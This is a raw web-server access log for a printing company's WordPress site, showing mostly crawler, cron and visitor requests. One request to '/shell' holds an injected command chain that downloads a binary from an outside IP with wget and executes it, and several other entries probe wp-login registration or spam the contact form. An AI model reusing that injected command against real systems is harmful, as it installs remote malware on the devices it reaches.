141.8.144.2 - - [25/Jul/2018:04:26:55 -0700] "GET /wp-content/uploads/2014/03/iPF610.pdf HTTP/1.1" 200 2154657 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
208.113.153.204 - - [25/Jul/2018:04:29:56 -0700] "POST /wp-cron.php?doing_wp_cron=1532518196.6483960151672363281250 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532518196.6483960151672363281250" "WordPress/4.9.7; http://www.aablueprint.com" 
104.154.198.228 - - [25/Jul/2018:04:29:56 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
192.243.55.95 - - [25/Jul/2018:04:31:02 -0700] "GET /supplies-repair/feed/ HTTP/1.1" 200 1468 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
192.243.55.95 - - [25/Jul/2018:04:31:15 -0700] "GET /supplies-repair/feed/ HTTP/1.1" 200 1470 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
208.113.153.204 - - [25/Jul/2018:04:32:29 -0700] "POST /wp-cron.php?doing_wp_cron=1532518349.5610170364379882812500 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532518349.5610170364379882812500" "WordPress/4.9.7; http://www.aablueprint.com" 
216.68.102.146 - - [25/Jul/2018:04:32:29 -0700] "GET / HTTP/1.1" 200 5767 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:30 -0700] "GET /wp-content/plugins/jetpack/modules/widgets/social-icons/social-icons.css?ver=20170506 HTTP/1.1" 304 188 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:30 -0700] "GET /wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.0.3 HTTP/1.1" 304 187 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:30 -0700] "GET /wp-content/plugins/jetpack/css/jetpack.css?ver=6.3.2 HTTP/1.1" 304 189 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:30 -0700] "GET /wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=5.0.3 HTTP/1.1" 304 188 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:30 -0700] "GET /wp-content/uploads/2018/07/HPPWXL8000.jpg HTTP/1.1" 200 322721 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:30 -0700] "GET /wp-content/uploads/2014/05/AABlueprint_Slider_Wraps_Layout.png HTTP/1.1" 200 410002 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:31 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo-aa_blueprint.gif HTTP/1.1" 200 4760 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:31 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/photo-print-services.jpg HTTP/1.1" 200 13413 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:32 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/icon-menu-mobile.gif HTTP/1.1" 200 418 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:32 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/arrow-right-white.png HTTP/1.1" 200 450 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:32 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/photo-equipment-sales.jpg HTTP/1.1" 200 11244 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:32 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/arrow-down-white.png HTTP/1.1" 200 832 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:32 -0700] "GET /wp-content/uploads/2014/03/home-slide-4.jpg HTTP/1.1" 200 92688 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:32 -0700] "GET /wp-content/uploads/2018/07/50th_slide.png HTTP/1.1" 200 231905 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:32 -0700] "GET /wp-content/uploads/2014/03/home-slide-5.jpg HTTP/1.1" 200 83953 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:32 -0700] "GET /wp-content/uploads/2014/04/home-slide-3_1.jpg HTTP/1.1" 200 84047 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:32 -0700] "GET /wp-content/uploads/2014/04/home-slide-2d.jpg HTTP/1.1" 200 155112 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:32 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo_repromax.jpg HTTP/1.1" 200 2122 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:32 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo_epson.jpg HTTP/1.1" 200 2077 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:33 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo_canon.jpg HTTP/1.1" 200 2015 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:33 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo_hp.jpg HTTP/1.1" 200 1852 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:33 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/logo_edge.jpg HTTP/1.1" 200 2756 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
216.68.102.146 - - [25/Jul/2018:04:32:33 -0700] "GET /wp-content/themes/aablueprint-v1.3/img/icon_facebook.jpg HTTP/1.1" 200 3491 "http://www.aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko" 
104.154.198.228 - - [25/Jul/2018:04:35:47 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
157.55.39.211 - - [25/Jul/2018:04:40:17 -0700] "GET /wp-content/uploads/2014/02/HP-T920-Brochure.pdf HTTP/1.1" 200 716065 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
104.154.198.228 - - [25/Jul/2018:04:41:59 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:04:42:00 -0700] "POST /wp-cron.php?doing_wp_cron=1532518920.7117829322814941406250 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532518920.7117829322814941406250" "WordPress/4.9.7; http://www.aablueprint.com" 
103.68.43.188 - - [25/Jul/2018:04:44:06 -0700] "GET / HTTP/1.1" 200 23041 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" 
176.103.56.85 - - [25/Jul/2018:04:46:21 -0700] "GET /contact-us/ HTTP/1.1" 301 507 "http://aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/53.0.2907.99" 
176.103.56.85 - - [25/Jul/2018:04:46:22 -0700] "GET /contact-us/ HTTP/1.1" 200 6001 "http://aablueprint.com/contact-us/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/53.0.2907.99" 
107.158.141.169 - - [25/Jul/2018:04:46:24 -0700] "GET /wp-login.php?action=register HTTP/1.0" 302 505 "http://www.aablueprint.com/" "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17" 
107.158.141.169 - - [25/Jul/2018:04:46:25 -0700] "GET /wp-login.php?registration=disabled HTTP/1.0" 200 1783 "http://www.aablueprint.com/wp-login.php?action=register" "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17" 
104.154.198.228 - - [25/Jul/2018:04:47:57 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:04:47:58 -0700] "POST /wp-cron.php?doing_wp_cron=1532519277.9841740131378173828125 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532519277.9841740131378173828125" "WordPress/4.9.7; http://www.aablueprint.com" 
40.77.167.141 - - [25/Jul/2018:04:49:09 -0700] "GET /equipment_sales/about-imageprograf-ipf815-mfp-m40/ HTTP/1.1" 200 6486 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.141 - - [25/Jul/2018:04:49:09 -0700] "GET /brands/canon-imageprograf/ HTTP/1.1" 200 9720 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.141 - - [25/Jul/2018:04:49:10 -0700] "GET /equipment_sales/hp-designjet-t120-24-in-eprinter/ HTTP/1.1" 200 6223 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.138 - - [25/Jul/2018:04:49:13 -0700] "GET /m_contactus.asp HTTP/1.1" 404 4568 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.138 - - [25/Jul/2018:04:49:14 -0700] "GET /wp-content/uploads/2014/02/HP-T790-Plotter-Brochure.pdf HTTP/1.1" 200 75260 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.138 - - [25/Jul/2018:04:49:14 -0700] "GET /print_services/mounting-finishing/ HTTP/1.1" 200 6671 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.138 - - [25/Jul/2018:04:49:15 -0700] "GET /brands/hp-design-jets/ HTTP/1.1" 200 7947 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.211 - - [25/Jul/2018:04:49:22 -0700] "GET /about_us/edge-certification/ HTTP/1.1" 200 5406 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.211 - - [25/Jul/2018:04:49:23 -0700] "GET /brands/oce-canon-solutions-america/ HTTP/1.1" 200 7568 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
216.244.66.230 - - [25/Jul/2018:04:50:44 -0700] "GET /robots.txt HTTP/1.1" 200 553 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
18.209.30.240 - - [25/Jul/2018:04:50:58 -0700] "GET / HTTP/1.1" 301 433 "-" "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3" 
18.209.30.240 - - [25/Jul/2018:04:50:58 -0700] "GET / HTTP/1.1" 200 5711 "-" "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3" 
185.126.2.115 - - [25/Jul/2018:04:51:09 -0700] "GET / HTTP/1.1" 200 23039 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" 
110.54.246.167 - - [25/Jul/2018:04:53:26 -0700] "GET /wp-login.php HTTP/1.1" 418 736 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
110.54.246.167 - - [25/Jul/2018:04:53:27 -0700] "GET / HTTP/1.1" 418 736 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
208.113.153.204 - - [25/Jul/2018:04:54:40 -0700] "POST /wp-cron.php?doing_wp_cron=1532519679.7700679302215576171875 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532519679.7700679302215576171875" "WordPress/4.9.7; http://www.aablueprint.com" 
104.154.198.228 - - [25/Jul/2018:04:54:39 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
77.75.79.11 - - [25/Jul/2018:04:56:18 -0700] "GET /robots.txt HTTP/1.1" 200 611 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
77.75.79.11 - - [25/Jul/2018:04:56:24 -0700] "GET /wp-content/uploads/2014/02/2.jpg HTTP/1.1" 304 167 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
77.75.79.11 - - [25/Jul/2018:04:56:31 -0700] "GET /809-2/ HTTP/1.1" 200 5742 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
41.45.124.80 - - [25/Jul/2018:04:57:50 -0700] "GET /shell?cd+/tmp;cd+/var;wget+http://199.195.254.118/jaws+-O+lwodo;sh%+lwodo;rm+-rf+lwodo HTTP/1.1" 400 402 "-" "Gemini/2.0" 
208.113.153.204 - - [25/Jul/2018:04:58:01 -0700] "POST /wp-cron.php?doing_wp_cron=1532519881.1458599567413330078125 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532519881.1458599567413330078125" "WordPress/4.9.7; http://www.aablueprint.com" 
192.243.55.95 - - [25/Jul/2018:04:58:00 -0700] "GET /home/feed/ HTTP/1.1" 200 1434 "-" "Mozilla/5.0 (compatible; SemrushBot/1.0~bm; +http://www.semrush.com/bot.html)" 
176.103.56.85 - - [25/Jul/2018:04:58:38 -0700] "GET /contact-us/ HTTP/1.1" 301 507 "http://aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.18 Safari/537.36 OPR/55.0.2962.0 (Edition developer)" 
176.103.56.85 - - [25/Jul/2018:04:58:38 -0700] "GET /contact-us/ HTTP/1.1" 200 5997 "http://aablueprint.com/contact-us/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.18 Safari/537.36 OPR/55.0.2962.0 (Edition developer)" 
172.245.254.165 - - [25/Jul/2018:04:58:40 -0700] "GET /wp-login.php?action=register HTTP/1.0" 200 4700 "http://www.aablueprint.com/" "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17" 
172.245.254.165 - - [25/Jul/2018:04:58:41 -0700] "GET /wp-login.php?action=register HTTP/1.1" 200 4737 "http://www.aablueprint.com/wp-login.php?action=register" "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17" 
172.245.254.165 - - [25/Jul/2018:04:58:52 -0700] "POST /wp-login.php?jetpack-protect-recovery=true HTTP/1.1" 200 4702 "http://www.aablueprint.com/wp-login.php?action=register" "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17" 
216.244.66.230 - - [25/Jul/2018:04:59:33 -0700] "GET /equipment_sales/oce-colorwave-650/feed/ HTTP/1.1" 404 17857 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
104.154.198.228 - - [25/Jul/2018:04:59:58 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
104.154.198.228 - - [25/Jul/2018:05:05:45 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:05:05:45 -0700] "POST /wp-cron.php?doing_wp_cron=1532520345.7215700149536132812500 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532520345.7215700149536132812500" "WordPress/4.9.7; http://www.aablueprint.com" 
193.169.145.66 - - [25/Jul/2018:05:06:17 -0700] "GET /contact-us/ HTTP/1.0" 301 491 "http://bbw.adultnet.in" "Mozilla/5.0 (Windows NT 5.0; rv:30.1) Gecko/20100101 Firefox/30.1" 
193.169.145.66 - - [25/Jul/2018:05:06:18 -0700] "GET /contact-us/ HTTP/1.0" 200 22910 "http://www.aablueprint.com/contact-us/" "Mozilla/5.0 (Windows NT 5.0; rv:30.1) Gecko/20100101 Firefox/30.1" 
193.169.145.66 - - [25/Jul/2018:05:06:20 -0700] "POST /contact-us/ HTTP/1.0" 200 22973 "http://www.aablueprint.com/contact-us/" "Mozilla/5.0 (Windows NT 5.0; rv:30.1) Gecko/20100101 Firefox/30.1" 
79.173.215.16 - - [25/Jul/2018:05:06:48 -0700] "GET /wp-login.php HTTP/1.1" 418 736 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
79.173.215.16 - - [25/Jul/2018:05:06:49 -0700] "GET / HTTP/1.1" 418 736 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
208.113.153.204 - - [25/Jul/2018:05:10:39 -0700] "POST /wp-cron.php?doing_wp_cron=1532520639.3747351169586181640625 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532520639.3747351169586181640625" "WordPress/4.9.7; http://www.aablueprint.com" 
104.154.198.228 - - [25/Jul/2018:05:10:38 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
66.249.64.10 - - [25/Jul/2018:05:11:16 -0700] "GET /robots.txt HTTP/1.1" 301 508 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.70.12 - - [25/Jul/2018:05:11:16 -0700] "GET /robots.txt HTTP/1.1" 200 611 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.13 - - [25/Jul/2018:05:11:17 -0700] "GET / HTTP/1.1" 301 489 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.70.12 - - [25/Jul/2018:05:11:18 -0700] "GET / HTTP/1.1" 200 5767 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
180.76.15.33 - - [25/Jul/2018:05:13:18 -0700] "GET /wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.aablueprint.com%2Fprint_services%2Fsmall-format-digital%2F&format=xml HTTP/1.1" 301 639 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
208.113.153.204 - - [25/Jul/2018:05:13:20 -0700] "POST /wp-cron.php?doing_wp_cron=1532520799.9096260070800781250000 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532520799.9096260070800781250000" "WordPress/4.9.7; http://www.aablueprint.com" 
180.76.15.30 - - [25/Jul/2018:05:13:19 -0700] "GET /wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.aablueprint.com%2Fprint_services%2Fsmall-format-digital%2F&format=xml HTTP/1.1" 200 1827 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
104.154.198.228 - - [25/Jul/2018:05:16:50 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
176.103.56.85 - - [25/Jul/2018:05:20:26 -0700] "GET /contact-us/ HTTP/1.1" 301 507 "http://aablueprint.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36,gzip(gfe)" 
176.103.56.85 - - [25/Jul/2018:05:20:26 -0700] "GET /contact-us/ HTTP/1.1" 200 5995 "http://aablueprint.com/contact-us/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36,gzip(gfe)" 
208.113.153.204 - - [25/Jul/2018:05:20:27 -0700] "POST /wp-cron.php?doing_wp_cron=1532521227.1289429664611816406250 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532521227.1289429664611816406250" "WordPress/4.9.7; http://www.aablueprint.com" 
184.175.244.148 - - [25/Jul/2018:05:20:29 -0700] "GET /wp-login.php?action=register HTTP/1.0" 200 4700 "http://www.aablueprint.com/" "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17" 
184.175.244.148 - - [25/Jul/2018:05:20:30 -0700] "GET /wp-login.php?action=register HTTP/1.1" 200 4737 "http://www.aablueprint.com/wp-login.php?action=register" "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17" 
184.175.244.148 - - [25/Jul/2018:05:20:37 -0700] "POST /wp-login.php?jetpack-protect-recovery=true HTTP/1.1" 200 4702 "http://www.aablueprint.com/wp-login.php?action=register" "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17" 
104.154.198.228 - - [25/Jul/2018:05:21:25 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
66.249.70.12 - - [25/Jul/2018:05:21:25 -0700] "GET /contact-us HTTP/1.1" 301 562 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.70.14 - - [25/Jul/2018:05:21:26 -0700] "GET /contact-us/ HTTP/1.1" 200 5941 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
208.113.153.204 - - [25/Jul/2018:05:22:35 -0700] "POST /wp-cron.php?doing_wp_cron=1532521355.0190401077270507812500 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532521355.0190401077270507812500" "WordPress/4.9.7; http://www.aablueprint.com" 
209.126.136.4 - - [25/Jul/2018:05:22:34 -0700] "GET / HTTP/1.1" 301 495 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36" 
37.229.205.136 - - [25/Jul/2018:05:23:28 -0700] "GET /contact-us/ HTTP/1.0" 301 491 "http://aablueprint.com/contact-us/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47" 
37.229.205.136 - - [25/Jul/2018:05:23:29 -0700] "GET /contact-us/ HTTP/1.0" 200 22910 "http://www.aablueprint.com/contact-us/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47" 
37.229.205.136 - - [25/Jul/2018:05:23:30 -0700] "POST /contact-us/ HTTP/1.0" 200 22973 "http://www.aablueprint.com/contact-us/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47" 
37.229.205.136 - - [25/Jul/2018:05:23:31 -0700] "GET /contact-us/ HTTP/1.0" 200 22856 "http://www.aablueprint.com/contact-us/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47" 
109.175.26.75 - - [25/Jul/2018:05:24:58 -0700] "GET /wp-login.php HTTP/1.1" 418 736 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
109.175.26.75 - - [25/Jul/2018:05:24:58 -0700] "GET / HTTP/1.1" 418 736 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
66.249.64.12 - - [25/Jul/2018:05:25:54 -0700] "GET /+pdf/cartplotref.pdf HTTP/1.1" 301 526 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)" 
208.113.153.204 - - [25/Jul/2018:05:27:28 -0700] "POST /wp-cron.php?doing_wp_cron=1532521648.8269979953765869140625 HTTP/1.1" 200 411 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532521648.8269979953765869140625" "WordPress/4.9.7; http://www.aablueprint.com" 
104.154.198.228 - - [25/Jul/2018:05:27:28 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9067 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:05:32:19 -0700] "POST /wp-cron.php?doing_wp_cron=1532521939.2414360046386718750000 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532521939.2414360046386718750000" "WordPress/4.9.7; http://www.aablueprint.com" 
104.154.198.228 - - [25/Jul/2018:05:32:18 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:05:37:02 -0700] "POST /wp-cron.php?doing_wp_cron=1532522222.2495679855346679687500 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532522222.2495679855346679687500" "WordPress/4.9.7; http://www.aablueprint.com" 
104.154.198.228 - - [25/Jul/2018:05:37:01 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9063 "-" "Java/1.8.0_121" 
137.74.30.53 - - [25/Jul/2018:05:40:20 -0700] "GET / HTTP/1.1" 400 415 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
104.154.198.228 - - [25/Jul/2018:05:42:39 -0700] "GET /brands/canon-imageprograf/feed/ HTTP/1.1" 200 9065 "-" "Java/1.8.0_121" 
208.113.153.204 - - [25/Jul/2018:05:42:41 -0700] "POST /wp-cron.php?doing_wp_cron=1532522560.9010870456695556640625 HTTP/1.1" 200 409 "http://www.aablueprint.com/wp-cron.php?doing_wp_cron=1532522560.9010870456695556640625" "WordPress/4.9.7; http://www.aablueprint.com" 
